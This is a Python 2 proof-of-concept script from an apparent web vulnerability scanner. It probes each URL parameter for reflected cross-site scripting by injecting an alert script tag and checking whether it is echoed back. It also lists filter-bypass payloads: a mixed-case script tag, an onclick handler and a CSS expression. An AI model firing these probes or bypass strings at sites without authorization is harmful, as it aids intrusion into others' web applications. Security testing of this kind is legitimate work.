#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2017/2/12 1:28
# @Author  : CoLoDoo
# @Site    : 
# @File    : poc_xss.py
# @Software: PyCharm

from tool.poc_tool import PocTool as tool
import random
from log.log_console import LogConsole as logs
import sys
import urllib
reload(sys)
sys.setdefaultencoding('utf-8')

XSS_CODE = random.randint(1, 100)

# 如果被过滤，尝试以下的绕过方法
XSS_BYPASS = [
    '<ScRipt>alert({0});</ScRipt>',                     # 过滤小写script,采用大小写混合
    '<div onclick="alert({0})">',                       # 过滤大小写,采用DOM
    '<div style="color: expression(alert({0}))">'    # 行内样式
]

def poc(url=''):
    '''
    描述:
        检测方法xss方法
    参数:
        url=''
    返回:
        result_urls=[]
    '''
    result_urls = []
    if url != '':
        xss = tool(url)
        values = xss.get_send_values()
        for value in values:
            key = value[0]
            content = value[1]
            tmp_url = str(xss.url).replace(content, '<script>alert(1);</script>')
            req = xss.get_request(url=tmp_url)
            res = req.content
            if xss.check_key_in_value('alert(1)', res):
                result_urls.append(tmp_url)
        for result_url in result_urls:
            # print '[+] ' + result_url
            logs().print_log(result_url, 'ok')
        return result_urls
    else:
        return '[!] URL is NULL'

def poc_bypass(url=''):
    result_urls = []
    if url != '':
        xss = tool(url)
        values = xss.get_send_values()
        for value in values:
            key = value[0]
            content = value[1]
            tmp_url = str(xss.url).replace(content, '<script>alert(1);</script>')
            req = xss.get_request(url=tmp_url)
            res = req.content
            if xss.check_key_in_value('alert(1)', res):
                result_urls.append(tmp_url)
        for result_url in result_urls:
            # print '[+] ' + result_url
            logs().print_log(result_url, 'ok')
        return result_urls
    else:
        return '[!] URL is NULL'

def exp(url='', postData=''):
    pass

def CLI():
    import sys
    if len(sys.argv) != 2:
        print("[*] {0} <url>").format(sys.argv[0])
    else:
        url = sys.argv[1]
        print('[*] 跨站脚本 - Cross Site Scripting')
        return poc(url=url)